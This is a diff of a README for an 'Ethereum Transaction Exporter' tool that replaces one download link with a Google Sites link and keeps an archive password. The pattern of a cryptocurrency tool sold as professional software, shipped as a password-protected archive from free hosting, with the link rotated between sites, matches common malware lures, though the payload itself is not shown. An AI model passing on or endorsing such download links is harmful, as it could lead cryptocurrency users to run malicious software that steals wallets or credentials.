@@ -30,9 +30,9 @@ Ethereum Transaction Exporter is a professional tool for users and developers wh
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t75-ethereum-transaction-exporter
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
